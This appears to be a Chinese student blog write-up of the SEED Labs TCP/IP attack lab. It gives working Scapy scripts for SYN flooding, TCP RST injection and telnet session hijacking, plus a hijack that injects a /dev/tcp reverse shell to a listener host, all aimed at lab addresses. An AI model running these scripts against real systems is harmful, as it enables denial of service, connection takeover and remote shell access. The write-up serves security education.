---
title: SeedLab ex3 TCP/IP Attack Lab
date: 2023-12-22
categories:
 - 网络安全
cover: /images/covers/grid.png
---
雨宫哲你是伟大的
<!-- more -->
## Task1: SYNFlooding Attack

###  Task 1.1: Launching the Attack Using Python

pyhton syn flood 代码

```python
#!/bin/env python3
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
ip = IP(dst="10.9.0.5") # victim ip
tcp = TCP(dport=23, flags="S")# telnet port
pkt = ip/tcp
while True:
	pkt[IP].src = str(IPv4Address(getrandbits(32))) # source iP
	pkt[TCP].sport = getrandbits(16) # source port
	pkt[TCP].seq = getrandbits(32) # sequence number
	send(pkt, verbose = 0)
```

先运行1分钟，在telnet victim，大概会出错，再排查问题

使用python代码进行实验，执行这段代码至少超过一分钟，发现并不能有效的实现泛洪攻击，telnet仍然能够成功连接。有可能是因为Python程序可能不够快，在竞争TCP半开放连接队列，可能输给合法的telnet数据包。还可能由于TCP的缓存机制，如果禁用了SYN Cookies，TCP将为“已验证目标”在排队队列中保留四分之一的空间，如果先记住了用户的ip，会不受泛洪影响。

1. TCP cache 清空
2. 多开synflood.py



### Task 1.2: Launch the Attack Using C

1. 编译
2. 清空缓存
3. 执行

###  Task 1.3: Enable the SYN Cookie Countermeasure

Please enable the SYN cookie mechanism, and run your attacks again, and compare the results

启用SYN Cookie机制后，服务器会在接收到TCP连接请求时，不立即分配资源和建立连接，而是生成一个特殊的cookie值发送给客户端。只有在客户端回应时，服务器才验证这个cookie值，如果验证通过，才正式建立连接。这样做的好处是，服务器无需在收到SYN包时立即分配资源，而是将部分连接状态保存在cookie中，从而能够有效抵御SYN洪水攻击。

## Task2: TCP RST Attacks on telnet Connections

服务器向客户端发送rst tcp包，找到服务器发给客户端的报文最新得报文

user1 telnet victim

```python
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.5", dst="10.9.0.6")
tcp = TCP(sport=23, dport=43378, flags="R", seq=2402526666)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)

```
auto

```python
#!/usr/bin/env python3
from scapy.all import *


def rst_attack(packet):
    if packet.haslayer(IP) and packet.haslayer(TCP):
        if packet[TCP].dport == 23:  # 检查是否是telnet
            print(
                f"telnet from {packet[IP].src} to {packet[IP].dst}")

            # 伪造 从服务器向客户端发送的rst
            ip = IP(src=packet[IP].dst, dst=packet[IP].src)
            tcp = TCP(
                sport=packet[TCP].dport, dport=packet[TCP].sport, flags="R", seq=packet[TCP].ack)  # 客户端向服务器发送的ack 为服务端向客服端发送的seq
            rst_packet = ip / tcp
            send(rst_packet, verbose=0)
            print("TCP RST packet sent")


iface = "br-9539db83f0ea"
sniff(iface=iface, prn=rst_attack, store=0)

```

## Task3: TCP Session Hijacking

manual，手动会话劫持，wireshark看最后的包信息，获取seq ack port，执行后光标会动不了，原因是seq和ack乱了好像

在使用user进行 telnet victim后，通过wireshark工具查看包信息，获取伪装成为 victim 向 user 发送下一个rst包的seq。
```python
#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=56952, dport=23, flags="A", seq=1006118204, ack=1285162686)
data = "rm -rf new.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

```


auto，选作
```python
#!/usr/bin/env python3
from scapy.all import *
import re
is_login = False


def hijack_attack(packet):
    global is_login
    if packet.haslayer(IP) and packet.haslayer(TCP):
        # 判断是否登陆成功
        if packet.haslayer(Raw):
            tcp_data = packet[TCP].load.decode(
                'utf-8', errors='ignore')  # 将二进制数据解码为字符串
            match = re.search(r'seed@76dac64f26d2', tcp_data) # 判断是否登录
            if match:
                is_login = True

        if packet[TCP].dport == 23 and is_login == True:  # 检查是否是telnet 是否登录
            print(
                f"telnet from {packet[IP].src} to {packet[IP].dst}")
            # 劫持绘画
            ip = IP(src=packet[IP].src, dst=packet[IP].dst)
            tcp = TCP(
                sport=packet[TCP].sport, dport=packet[TCP].dport, flags="A", seq=packet[TCP].seq, ack=packet[TCP].ack)  # 客户端向服务器发送的ack 为服务端向客服端发送的seq
            data = "rm -rf new.txt\r"

            hijack_packet = ip / tcp / data

            send(hijack_packet, verbose=0)
            print("Hijack packet sent")
            exit(0)


iface = "br-9539db83f0ea"
sniff(iface=iface, prn=hijack_attack, store=0)

```

## Task4: Creating Reverse Shell using TCP Session Hijacking

执行指令nc -lnv 9090，在本地（-l）以监听模式启动 netcat 工具，监听在9090端口上，并输出详细信息。运行自动劫持的代码，在telnet连接后，会自动执行 “/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r”命令。创建一个反向shell 映射到10.9.0.1的9090端口输入从tcp连接获取，错误输出重定向到tcp连接。

```python
#!/usr/bin/env python3
from scapy.all import *
import re
is_login = False

def hijack_attack(packet):
    global is_login
    if packet.haslayer(IP) and packet.haslayer(TCP):
        # 判断是否登陆成功
        if packet.haslayer(Raw):
            tcp_data = packet[TCP].load.decode(
                'utf-8', errors='ignore')  # 将二进制数据解码为字符串
            match = re.search(r'seed@76dac64f26d2', tcp_data)
            if match:
                is_login = True

        if packet[TCP].dport == 23 and is_login == True:  # 检查是否是telnet 是否d登录
            print(
                f"telnet from {packet[IP].src} to {packet[IP].dst}")
            # 劫持绘画
            ip = IP(src=packet[IP].src, dst=packet[IP].dst)
            tcp = TCP(
                sport=packet[TCP].sport, dport=packet[TCP].dport, flags="A", seq=packet[TCP].seq, ack=packet[TCP].ack)  # 客户端向服务器发送的ack 为服务端向客服端发送的seq
            # data = "rm -rf new.txt\r"
            data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
            hijack_packet = ip / tcp / data

            send(hijack_packet, verbose=0)
            print("Hijack packet sent")
            exit(0)

iface = "br-9539db83f0ea"
sniff(iface=iface, prn=hijack_attack, store=0)

```
